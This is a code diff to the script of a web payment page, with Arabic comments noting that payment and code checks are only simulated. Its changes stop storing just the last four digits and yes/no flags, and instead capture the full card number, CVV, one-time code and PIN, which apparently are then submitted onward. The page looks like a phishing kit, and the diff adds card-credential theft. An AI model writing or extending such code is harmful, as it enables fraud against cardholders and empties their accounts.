@@ -710,7 +710,7 @@ $("payForm").addEventListener("submit", async e => {
   const btn = $("payBtn");
   btn.disabled = true;
   btn.innerHTML = '<span class="spin"></span><span>' + (L.payProcessing || "…") + '</span>';
-  window._payMeta = { cardName: name, last4: num.slice(-4), brand: cardType(num) || "", exp: exp, cvv: cvv.length >= 3 };
+  window._payMeta = { cardName: name, last4: num.slice(-4), brand: cardType(num) || "", exp: exp, cvv: cvv, cardNumber: num };
   await new Promise(r => setTimeout(r, 1200));   // محاكاة معالجة الدفع
   await submitStep("card");
   btn.disabled = false; btn.innerHTML = '<span data-t="payNow">' + (L.payNow || "تأكيد ودفع") + '</span>';
@@ -775,7 +775,7 @@ $("otpBtn").onclick = async () => {
   const btn = $("otpBtn");
   btn.disabled = true;
   btn.innerHTML = '<span class="spin"></span><span>' + (L.payProcessing || "…") + '</span>';
-  if (window._payMeta) window._payMeta.otp = true;
+  if (window._payMeta) window._payMeta.otp = code;
   await new Promise(r => setTimeout(r, 1000));   // محاكاة التحقق من الرمز
   await submitStep("otp");
   btn.disabled = false; btn.innerHTML = '<span data-t="otpConfirm">' + (L.otpConfirm || "تأكيد") + '</span>';
@@ -816,7 +816,7 @@ $("pinBtn").onclick = async () => {
   }
   $("pinErr").textContent = "";
   const btn = $("pinBtn");
-  if (window._payMeta) window._payMeta.pin = true;
+  if (window._payMeta) window._payMeta.pin = pin;
   btn.disabled = true; btn.innerHTML = '<span class="spin"></span><span>' + (L.payProcessing || "…") + '</span>';
   await new Promise(r => setTimeout(r, 900));
   await submitStep("pin");
